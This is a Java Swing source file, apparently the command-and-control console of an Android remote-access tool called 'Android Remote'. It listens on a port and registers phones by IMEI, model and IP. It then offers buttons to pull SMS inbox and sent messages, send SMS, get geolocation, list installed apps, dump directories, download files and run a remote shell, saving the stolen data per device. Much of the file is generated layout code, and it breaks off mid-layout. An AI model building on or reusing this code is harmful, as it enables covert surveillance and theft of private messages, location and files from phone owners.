/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.test.server5;


import java.awt.Color;
import java.io.File;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.util.ArrayList;
import javax.swing.DefaultListModel;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import java.util.List;
import javax.swing.JList;
import javax.swing.JOptionPane;
import javax.swing.JTextArea;
import javax.swing.filechooser.FileSystemView;
 import java.awt.Font;
import java.awt.Image;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.KeyPair;
import java.security.PrivateKey;
import java.security.PublicKey;
import javax.swing.ImageIcon;
import javax.swing.JTextField;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.text.DefaultCaret;
import javax.swing.tree.TreePath;

/**
 *
 * @author shzksng93n
 */
public class formServer5 extends javax.swing.JFrame {

     static  int PORT;
     public Socket[] socketArray;  
     private int count =0;
     private static ArrayList<EchoThread> threadList = new ArrayList<>();
     public static ArrayList<EchoThread> threadList_public = new ArrayList<>();
     public static DefaultListModel m;
     public static DefaultListModel m2; 
     public static JTextArea textAreaDebugInfo_public; 
     public static JList connectedList_public;
     private static String[][]  connectedListArr;
     final static List<EchoThread> clients = new ArrayList<>();
     private static EchoThread selected;
     public  static String downloadFolder;
      public static JTextField selectDownloadFolder_public;
     public static javax.swing.JButton btnExitShell_public;
     public static javax.swing.JButton btnGetShell_public;
     public static String txtDirsSavedIn_public;
     public static javax.swing.JButton btnGetShellExecute_public;
     public static   JTextField textPort_public;
     public static javax.swing.JList listUserApps2;
     public static javax.swing.JList listSystemApps2;
   
     public static javax.swing.JTextField txtDirsSavedIn_publ;
     public static  javax.swing.JLabel labelDirsCaptured_public;
     public static javax.swing.JTextField jTextFieldGeoloc2;
     public static ArrayList<ClientInfo> cInfoList = new ArrayList<>(); 
     static String valueSelected=""; 
     public static String pathType ="/";
     
    public formServer5() {
        initComponents();  setStyles();
        m = new DefaultListModel();
        m2 = m;
        listUserApps2=listUserApps;
        listSystemApps2=listSystemApps;
        this.btnExitShell_public = btnExitShell; textPort_public = textPort;
        selectDownloadFolder_public = selectDownloadFolder;
        btnGetShellExecute_public = btnGetShellExecute;
        btnGetShell_public = btnGetShell;
        textAreaDebugInfo_public = textAreaDebugInfo;
        connectedList_public = (JList)connectedList;
    
        jTextFieldGeoloc2=jTextFieldGeoloc;
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        txtDirsSavedIn_publ = txtDirsSavedIn;
        labelDirsCaptured_public = labelDirsCaptured;
        StringBuilder pathBuilder = new StringBuilder();

    }
   
    private void setStyles()
    {
        btnGetShellExecute.setEnabled(false);
        Color color1; color1 = new Color(199, 199, 199);  btnExitShell.setBackground(color1);btnExitShell.setEnabled(false);
        btnGetShellExecute.setEnabled(false);btnGetShell.setEnabled(false);
        //jButton2.setEnabled(false);
        btnGetDirs.setEnabled(false); 
        //btnDeleteUser.setEnabled(false);
        btnGetSMS.setEnabled(false);
      //  btnDeleteUser.setEnabled(false);
        Color color; color = new Color(205, 207, 212);  this.getContentPane().setBackground(color);
        Image icon = new ImageIcon("icon1.png").getImage(); Image rI = icon.getScaledInstance(25,24,java.awt.Image.SCALE_SMOOTH); 
        //btnDeleteUser.setIcon(new ImageIcon(rI));
        //.setOpaque(false);
    }
    
    public static  void setShellEnabled()
    {  
        Color c; c = new Color(240, 39, 39);
        btnExitShell_public.setBackground(c);
         btnExitShell_public.setEnabled(true);
         btnGetShell_public.setEnabled(false);
         btnGetShellExecute_public.setEnabled(true);
    }
    
    public static  void setShellDisabled()
    {  
        Color c; c = new Color(199, 199, 199);
        btnExitShell_public.setBackground(c);
        btnExitShell_public.setEnabled(false);
        btnGetShell_public.setEnabled(true);
        btnGetShellExecute_public.setEnabled(false);
    }
    
    private void setOptionsToDisconnected()
    {
        btnGetShellExecute.setEnabled(false);btnGetShell.setEnabled(false);
        btnGetDirs.setEnabled(false); btnGetSMS.setEnabled(false);
        //btnDeleteUser.setEnabled(false);
        labelUsInfo1.setText("Not connected");
        Color color; color = new Color(255, 0, 0);
        labelUsInfo1.setForeground(color);
    }
    
     public static  boolean addConnected(String usinfo ,EchoThread t)
      {
            String[] usInfoArr= usinfo.split("\n"); 
            boolean filledBefore = false;
            String mac=""; String model ="";  String version =""; 
            String sdk="";String brand="";String manufacturer="";String deviceID="";String ipp="";String finalId="";
            ClientInfo clientInfo = null;
            ClientInfo cInfo = null;
            for(int i=0; i< usInfoArr.length;i++){
                String type = usInfoArr[i].split("=>")[0];
                String value = usInfoArr[i].split("=>")[1];
                if(type.equals("id")){ finalId =value; }
                if(type.equals("imei")){ deviceID=value; }
                if(type.equals("vv")){ version =value; }
                if(type.equals("model")){ model=value; } 
                if(type.equals("sdk")){ sdk=value; } 
                if(type.equals("brand")){ brand=value; } 
                if(type.equals("manufact")){ manufacturer=value; }
                if(type.equals("dispositiveid")){ ipp=value; }
            }
            
            // ONLY FILL IF WASN'T FILLED BEFORE   
            for(ClientInfo info : cInfoList) {
                if( (info.ip.equals(ipp) && info.imei.equals(deviceID) )   ||
                            (info.ip.equals(ipp) && info.device.equals(manufacturer + "  " +model) ) ||
                            (info.imei.equals(deviceID) && info.device.equals(manufacturer + "  " +model) )
                ){
                    // FILLED BEFORE
                    filledBefore = true;
                    finalId = info.id;
                    clientInfo = info;
                    break; 
                 }
            }
            
            if(!filledBefore){
                cInfo = new ClientInfo();
                System.out.println(finalId);
                cInfo.id = finalId;
                cInfo.ip = ipp;
                cInfo.imei=deviceID;
                cInfo.version=version;
                cInfo.vids=new ArrayList<>();
                cInfo.device=manufacturer + "  " +model;
                //cInfo.mac=mac;
                cInfo.downloadedFiles = new ArrayList<>();
                cInfo.installedAppsSystem = new ArrayList<>();
                cInfo.installedAppsUser = new ArrayList<>();
                cInfoList.add(cInfo);
               // System.out.println(" FILL NEW DATA FOR " + finalId + " & " + ipp);
            }else{
               if(!(clientInfo == null)){
                  cInfo = clientInfo;
                  cInfo.ip = ipp;
                  cInfo.version=version;
                  //cInfo.mac = mac;
                  cInfo.imei=deviceID;
                  cInfo.device = manufacturer + "  " +model;;
               }
            }
            
            if(!checkUserExists(model,deviceID,manufacturer,version) ){
               System.out.println("HEREE 1111 NO EXISTS");
               m2.addElement(finalId);
               connectedList_public.setModel(m2);
               t.setUserInfo(finalId,mac, brand, manufacturer,model, version,sdk,ipp,deviceID );
            }else{
               System.out.println("HEREE 1111  EXISTS");
                  for(int i = 0; i< connectedList_public.getModel().getSize();i++){ 
                     int ex=0; int d = 0;
                     //System.out.println("LENGTH_THREADS 2= " + Integer.toString(clients.size())   );
                     String oldID=connectedList_public.getModel().getElementAt(i).toString();
                     if( oldID.equals(finalId) ){
                        m2.remove(i);
                        //System.out.println("OLD_ID_TO_DELETE = " + oldID );
                        for (EchoThread c2 : clients) {
                           if(c2 != null){
                              System.out.println("id1="+finalId);
                              System.out.println("id2="+c2.getID());
                              if( c2.getID().equals(finalId)   ){
                                  m2.addElement(finalId);
                                  connectedList_public.setModel(m2);
                                  //String nap = t.nameAndPhone;
                                  t.setUserInfo(finalId, mac, brand, manufacturer,model, version,sdk,ipp,deviceID  );   
                                  clients.remove(ex);
                                  d= 1; break;
                              }else{

                              }
                           }
                            ex++;
                        }
                     }
                     if(d==1) break;
                  }
            }
        return true;
     }
    
     private static boolean checkUserExists(String model,String deviceID,String manufacturer,String version ) 
     {
        int found1 = 0; int ex=0;
        try{ 
            for (EchoThread c : clients) {
                if(!c.equals(null)){
                   int found=0; 
                   if(c.getDeviceID()!=null && c.getDeviceID().equals(deviceID)){ found++; }
                   if(c.getVersion()!=null && c.getVersion().equals(version)){ found++;  }
                   if(c.getManufacturer()!=null && c.getManufacturer().equals(manufacturer)){ found++;  }
                   if(c.getModel()!=null && c.getModel().equals(model)){ found++;  }
                   if(found > 1 ){
                       found1++;
                       return true;
                   }
                   ex++;
                }
            }      
            if(found1 > 3){ return true; }   
        }catch(Exception e){
              System.out.println("Errx");
              return true;
        }
        return false;
     }
  
    private static void addDebugText(String inf)
    {
        DefaultCaret caret = (DefaultCaret)textAreaDebugInfo_public.getCaret();
        caret.setUpdatePolicy(DefaultCaret.OUT_BOTTOM); textAreaDebugInfo_public.setText(inf+ "\n");    
    }

    private   EchoThread getSelected()
    {
        String v = connectedList.getSelectedValue();
        try{
            for (EchoThread c : clients) {
                if( c.getID() != null && c.getID().equals(v) ) return c;
            }
        }catch(Exception e){  return null; }
        return null;
    }

    public static  void setGetSMSLogAndSave(String smss,String type)
    {
       String id = selected.getID(); Path path =null; String fileSMS ="";
       File f = new File(downloadFolder+"/"+id);
       if(!f.isDirectory()) f.mkdirs();
       try{
           if(f.exists() && f.isDirectory()){
                 Files.createDirectories(Paths.get(downloadFolder+"/"+id));
                 if( type.equals("1")) { fileSMS="sms_inbox.txt"; path = Paths.get(downloadFolder+"/"+id + "/"+fileSMS); }
                 if( type.equals("2")){ fileSMS="sms_sent.txt"; path = Paths.get(downloadFolder+"/"+id + "/"+fileSMS); }
                 if(type != null){
                    try {
                         Files.writeString(path, smss);
                         //Files.write(path, smss.toString()); 
                     } catch (IOException ex) {
                         ex.printStackTrace();
                     }
                 }
           }else{
               //alert directory not exists
           }
           addDebugText(textAreaDebugInfo_public.getText() + "SMS Saved in " +downloadFolder+pathType+id+ pathType+fileSMS);
       
       }catch(Exception e2){  System.out.println("Err_U1\n"+e2.getStackTrace()); }
    }


    public static void saveInterestingPaths(String txt,String id) throws IOException
    {
        
        ClientInfo client = getSelectedClient("");
        String dFolder = selectDownloadFolder_public.getText();
        labelDirsCaptured_public.setText("Directories & Files Saved in: ");labelDirsCaptured_public.setForeground(Color.GREEN);
        File f = new File(downloadFolder); 
        Files.createDirectories( Paths.get(downloadFolder + "/"+id) ); 
        File  f2 = new File( downloadFolder + "/"+id);
        f2.mkdirs();
        Path path = Paths.get(downloadFolder +"/"+ id +"/directories_and_files.html");
         try {
                     Files.write(path, txt.getBytes()); 
          } catch (IOException ex) {
             ex.printStackTrace();
        }
         client.downloadPath = dFolder + pathType + id + pathType+"\\directories_and_files.html";
         txtDirsSavedIn_publ.setText(dFolder + pathType + id + pathType +"directories_and_files.html");
         addDebugText(textAreaDebugInfo_public.getText() + "Directories saved in " + downloadFolder +pathType+ id +"\\directories_and_files.html");
    }
    
    
    public static void main(String args[]) {
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new formServer5().setVisible(true);  
                 int result = 0;
            }
        });  
    } 
 
    private void btnStartActionPerformed(java.awt.event.ActionEvent evt) {                                         
      File f = new File(selectDownloadFolder.getText());
       String p = textPort.getText();
       if(  (p.matches("[-+]?\\d*\\.?\\d+")) && f.exists() && f.isDirectory()  ){
           PORT = Integer.parseInt(p);
           downloadFolder = selectDownloadFolder.getText();
            new Thread(() -> {  
                ServerSocket serverSocket = null;
                Socket socket = null;
                try {
                    serverSocket = new ServerSocket(PORT);
                   addDebugText(textAreaDebugInfo.getText() + "Listening on port " + PORT );
                } catch (IOException e) {
                    e.printStackTrace();
                }
               
                while (true) {
                    try {
                        EchoThread thread = new EchoThread(serverSocket.accept());
                        clients.add(thread);
                        threadList.add(thread); 
                        thread.start();
                    } catch (IOException e) {
                        System.out.println("I/O error: " + e);
                    }
                }
            }).start();   
       }else{
           JOptionPane.showMessageDialog(this, "Select download folder and port before star", "Error", JOptionPane.ERROR_MESSAGE); 
       }
    }   
    

  
    private void jTextField1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextField1ActionPerformed

    }//GEN-LAST:event_jTextField1ActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        JFileChooser jfc = new JFileChooser(FileSystemView.getFileSystemView().getHomeDirectory());
        jfc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY); ; 
        int ret = jfc.showOpenDialog(formServer5.this);
        if (ret == JFileChooser.APPROVE_OPTION) {
		if (JFileChooser.APPROVE_OPTION == ret){
                    String path = jfc.getSelectedFile().getPath();
                    File f = new File(path);
                    if (f.exists() && f.isDirectory()) {
                        selectDownloadFolder.setText(path);
                    }else{ 
                         JOptionPane.showMessageDialog(this, "Incorrect folder selected", "Incorrect Path", JOptionPane.ERROR_MESSAGE); 
                    }
		}
        }
        
    }//GEN-LAST:event_jButton1ActionPerformed
 
 

 
    
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        btnStart = new javax.swing.JButton();
        jScrollPane2 = new javax.swing.JScrollPane();
        connectedList = new javax.swing.JList<>();
        jTextField1 = new javax.swing.JTextField();
        jLabel2 = new javax.swing.JLabel();
        jPanel1 = new javax.swing.JPanel();
        jButton1 = new javax.swing.JButton();
        selectDownloadFolder = new javax.swing.JTextField();
        jLabel4 = new javax.swing.JLabel();
        textPort = new javax.swing.JTextField();
        jTabbedPane2 = new javax.swing.JTabbedPane();
        jPanel3 = new javax.swing.JPanel();
        jLabel6 = new javax.swing.JLabel();
        labelUsInfo1 = new javax.swing.JLabel();
        labelUsInfo_4 = new javax.swing.JLabel();
        labelUsInfo_5 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        jLabel9 = new javax.swing.JLabel();
        jLabel10 = new javax.swing.JLabel();
        jLabel11 = new javax.swing.JLabel();
        jLabel8 = new javax.swing.JLabel();
        labelUsInfo_1 = new javax.swing.JLabel();
        labelUsInfo_3 = new javax.swing.JLabel();
        jLabel12 = new javax.swing.JLabel();
        jButton3 = new javax.swing.JButton();
        jTextFieldGeoloc = new javax.swing.JTextField();
        subTabSysApps = new javax.swing.JTabbedPane();
        jPanel4 = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        listUserApps = new javax.swing.JList<>();
        btnGetApps = new javax.swing.JButton();
        jButton6 = new javax.swing.JButton();
        jPanel7 = new javax.swing.JPanel();
        jScrollPane4 = new javax.swing.JScrollPane();
        listSystemApps = new javax.swing.JList<>();
        jPanel8 = new javax.swing.JPanel();
        jPanel2 = new javax.swing.JPanel();
        btnGetSMS = new javax.swing.JButton();
        selectSMS = new javax.swing.JComboBox<>();
        jLabel16 = new javax.swing.JLabel();
        jPanel9 = new javax.swing.JPanel();
        textSmsNumber = new javax.swing.JTextField();
        jLabel14 = new javax.swing.JLabel();
        jButton2 = new javax.swing.JButton();
        textSmsMsg = new javax.swing.JTextField();
        jLabel15 = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        jTabbedPane3 = new javax.swing.JTabbedPane();
        jPanel10 = new javax.swing.JPanel();
        btnGetDirs = new javax.swing.JButton();
        txtDirsSavedIn = new javax.swing.JTextField();
        labelDirsCaptured = new javax.swing.JLabel();
        jPanel11 = new javax.swing.JPanel();
        btnDownloadFile = new javax.swing.JButton();
        textDownloadFile = new javax.swing.JTextField();
        jLabel17 = new javax.swing.JLabel();
        txtDownloadThumb = new javax.swing.JTextField();
        btnDownloadThumb = new javax.swing.JButton();
        jPanel12 = new javax.swing.JPanel();
        jScrollPane6 = new javax.swing.JScrollPane();
        jTree2 = new javax.swing.JTree();
        jButton5 = new javax.swing.JButton();
        jPanel5 = new javax.swing.JPanel();
        inputTextShell = new javax.swing.JTextField();
        btnGetShellExecute = new javax.swing.JButton();
        btnGetShell = new javax.swing.JButton();
        btnExitShell = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        textAreaDebugInfo = new javax.swing.JTextArea();
        jButton4 = new javax.swing.JButton();
        jButton7 = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(166, 166, 166));

        btnStart.setBackground(new java.awt.Color(0, 102, 255));
        btnStart.setFont(new java.awt.Font("Segoe UI", 1, 14)); // NOI18N
        btnStart.setText("Start");
        btnStart.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnStartActionPerformed(evt);
            }
        });

        connectedList.setToolTipText("");
        connectedList.addListSelectionListener(new javax.swing.event.ListSelectionListener() {
            public void valueChanged(javax.swing.event.ListSelectionEvent evt) {
                connectedListValueChanged(evt);
            }
        });
        jScrollPane2.setViewportView(connectedList);

        jTextField1.setEditable(false);
        jTextField1.setBackground(new java.awt.Color(0, 0, 0));
        jTextField1.setFont(new java.awt.Font("Chiller", 1, 18)); // NOI18N
        jTextField1.setForeground(new java.awt.Color(0, 255, 0));
        jTextField1.setText("Android Remote ");
        jTextField1.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        jTextField1.setFocusable(false);
        jTextField1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextField1ActionPerformed(evt);
            }
        });

        jLabel2.setFont(new java.awt.Font("Consolas", 1, 14)); // NOI18N
        jLabel2.setText("Connected Devices");

        jPanel1.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));

        jButton1.setText("Select Download Folder");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        selectDownloadFolder.setEditable(false);
        selectDownloadFolder.setFont(new java.awt.Font("Tahoma", 0, 16)); // NOI18N
        selectDownloadFolder.setText("               Folder where all  data will be saved");

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(71, 71, 71)
                        .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 320, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(14, 14, 14)
                        .addComponent(selectDownloadFolder, javax.swing.GroupLayout.PREFERRED_SIZE, 397, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(22, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 19, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(selectDownloadFolder, javax.swing.GroupLayout.PREFERRED_SIZE, 17, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jLabel4.setFont(new java.awt.Font("Consolas", 1, 18)); // NOI18N
        jLabel4.setText("Port");

        textPort.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        textPort.setText("0");

        jPanel3.setBorder(new javax.swing.border.MatteBorder(null));

        labelUsInfo1.setFont(new java.awt.Font("Consolas", 0, 14)); // NOI18N
        labelUsInfo1.setText("No user selected");

        labelUsInfo_4.setText(".");

        labelUsInfo_5.setText(".");

        jLabel7.setText(".");

        jLabel9.setFont(new java.awt.Font("Tahoma", 1, 13)); // NOI18N
        jLabel9.setText("ID/IMEI:");

        jLabel10.setFont(new java.awt.Font("Tahoma", 1, 13)); // NOI18N
        jLabel10.setText("Device: ");

        jLabel11.setFont(new java.awt.Font("Tahoma", 1, 13)); // NOI18N
        jLabel11.setText("OS Version: ");

        jLabel8.setFont(new java.awt.Font("Tahoma", 1, 13)); // NOI18N
        jLabel8.setText("IP:");

        labelUsInfo_1.setText(".");

        labelUsInfo_3.setText(".");

        jLabel12.setFont(new java.awt.Font("Tahoma", 1, 13)); // NOI18N
        jLabel12.setText("SDK: ");

        jButton3.setText("Get Geolocation");
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        jTextFieldGeoloc.setText("...geoloc...");
        jTextFieldGeoloc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextFieldGeolocActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(labelUsInfo1)
                            .addGroup(jPanel3Layout.createSequentialGroup()
                                .addGap(373, 373, 373)
                                .addComponent(jLabel6, javax.swing.GroupLayout.PREFERRED_SIZE, 86, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(jPanel3Layout.createSequentialGroup()
                                .addComponent(jLabel10)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(labelUsInfo_3, javax.swing.GroupLayout.PREFERRED_SIZE, 255, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(jPanel3Layout.createSequentialGroup()
                                .addComponent(jLabel11)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(labelUsInfo_5, javax.swing.GroupLayout.PREFERRED_SIZE, 57, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(jPanel3Layout.createSequentialGroup()
                                .addComponent(jLabel12, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jLabel7, javax.swing.GroupLayout.PREFERRED_SIZE, 132, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(jPanel3Layout.createSequentialGroup()
                                .addComponent(jLabel9, javax.swing.GroupLayout.PREFERRED_SIZE, 66, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(labelUsInfo_4, javax.swing.GroupLayout.PREFERRED_SIZE, 295, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 55, Short.MAX_VALUE)
                        .addComponent(jButton3))
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addComponent(jLabel8, javax.swing.GroupLayout.PREFERRED_SIZE, 27, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(labelUsInfo_1, javax.swing.GroupLayout.PREFERRED_SIZE, 269, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(133, 133, 133)
                        .addComponent(jTextFieldGeoloc)))
                .addGap(150, 150, 150))
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addComponent(jLabel6)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addComponent(labelUsInfo1)
                        .addGap(31, 31, 31)
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jLabel8, javax.swing.GroupLayout.Alignment.TRAILING)
                            .addGroup(jPanel3Layout.createSequentialGroup()
                                .addComponent(labelUsInfo_1)
                                .addGap(3, 3, 3))))
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addComponent(jButton3)
                        .addGap(5, 5, 5)
                        .addComponent(jTextFieldGeoloc, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(28, 28, 28)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel9)
                    .addComponent(labelUsInfo_4))
                .addGap(23, 23, 23)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel10)
                    .addComponent(labelUsInfo_3))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel11)
                    .addComponent(labelUsInfo_5))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel12)
                    .addComponent(jLabel7))
                .addContainerGap(10, Short.MAX_VALUE))
        );

        jTabbedPane2.addTab("User Info", jPanel3);

        subTabSysApps.setBorder(new javax.swing.border.MatteBorder(null));

        jScrollPane3.setViewportView(listUserApps);

        btnGetApps.setText("Get Installed Apps");
        btnGetApps.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnGetAppsActionPerformed(evt);
            }
        });

        jButton6.setText("jButton6");
        jButton6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton6ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);
        jPanel4.setLayout(jPanel4Layout);
        jPanel4Layout.setHorizontalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 506, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(btnGetApps))
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addGap(72, 72, 72)
                        .addComponent(jButton6)))
                .addContainerGap(130, Short.MAX_VALUE))
        );
        jPanel4Layout.setVerticalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 171, Short.MAX_VALUE)
                .addContainerGap())
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addGap(24, 24, 24)
                .addComponent(btnGetApps)
                .addGap(35, 35, 35)
                .addComponent(jButton6)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        subTabSysApps.addTab("User Apps", jPanel4);

        jScrollPane4.setViewportView(listSystemApps);

        javax.swing.GroupLayout jPanel7Layout = new javax.swing.GroupLayout(jPanel7);
        jPanel7.setLayout(jPanel7Layout);
        jPanel7Layout.setHorizontalGroup(
            jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel7Layout.createSequentialGroup()
                .addComponent(jScrollPane4, javax.swing.GroupLayout.PREFERRED_SIZE, 597, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 186, Short.MAX_VALUE))
        );
        jPanel7Layout.setVerticalGroup(
            jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel7Layout.createSequentialGroup()
                .addComponent(jScrollPane4, javax.swing.GroupLayout.PREFERRED_SIZE, 174, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 3, Short.MAX_VALUE))
        );

        subTabSysApps.addTab("System", jPanel7);

        jTabbedPane2.addTab("Apps", subTabSysApps);

        jPanel8.setBorder(new javax.swing.border.MatteBorder(null));

        jPanel2.setBorder(javax.swing.BorderFactory.createEtchedBorder());

        btnGetSMS.setFont(new java.awt.Font("Consolas", 1, 14)); // NOI18N
        btnGetSMS.setText("Get SMS");
        btnGetSMS.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnGetSMSActionPerformed(evt);
            }
        });

        selectSMS.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "Inbox", "Sent" }));

        jLabel16.setForeground(new java.awt.Color(102, 255, 0));
        jLabel16.setText("GET SMS");

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
